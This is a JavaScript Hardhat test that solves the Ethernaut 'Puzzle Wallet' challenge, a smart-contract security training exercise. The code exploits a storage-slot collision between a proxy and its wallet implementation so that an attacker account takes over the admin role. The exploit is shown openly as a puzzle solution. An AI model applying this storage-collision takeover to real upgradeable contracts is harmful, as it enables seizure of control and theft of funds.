const { loadFixture } = require("@nomicfoundation/hardhat-network-helpers");
const { expect } = require("chai");

describe("Ethernaut - Twenty Four", function () {
  async function deployContracts() {
    const [deployer, user1] = await ethers.getSigners();

    const EthernautTwentyFourPuzzleWallet = await ethers.getContractFactory(
      "EthernautTwentyFourPuzzleWallet"
    );
    const ethernautTwentyFourPuzzleWallet =
      await EthernautTwentyFourPuzzleWallet.deploy();
    await ethernautTwentyFourPuzzleWallet.deployed();

    const EthernautTwentyFourPuzzleProxy = await ethers.getContractFactory(
      "EthernautTwentyFourPuzzleProxy"
    );
    const ethernautTwentyFourPuzzleProxy =
      await EthernautTwentyFourPuzzleProxy.deploy(
        deployer.address,
        ethernautTwentyFourPuzzleWallet.address,
        []
      );
    await ethernautTwentyFourPuzzleProxy.deployed();

    return {
      ethernautTwentyFourPuzzleWallet,
      ethernautTwentyFourPuzzleProxy,
      deployer,
      user1,
    };
  }

  describe("Exploit", function () {
    it("Admin role claimed", async function () {
      const { ethernautTwentyFourPuzzleProxy, deployer, user1 } =
        await loadFixture(deployContracts);

      expect(await ethernautTwentyFourPuzzleProxy.admin()).to.equal(
        deployer.address
      );

      await ethernautTwentyFourPuzzleProxy.proposeNewAdmin(user1.address);

      const helperProxy = await ethers.getContractAt(
        "EthernautTwentyFourHelperInterface",
        ethernautTwentyFourPuzzleProxy.address
      );

      await helperProxy.connect(user1).addToWhitelist(user1.address);
      const paddedAttackerAddress = ethers.utils.defaultAbiCoder.encode(
        ["address"],
        [user1.address]
      );
      await helperProxy.connect(user1).setMaxBalance(paddedAttackerAddress);

      expect(await ethernautTwentyFourPuzzleProxy.admin()).to.equal(
        user1.address
      );
    });
  });
});
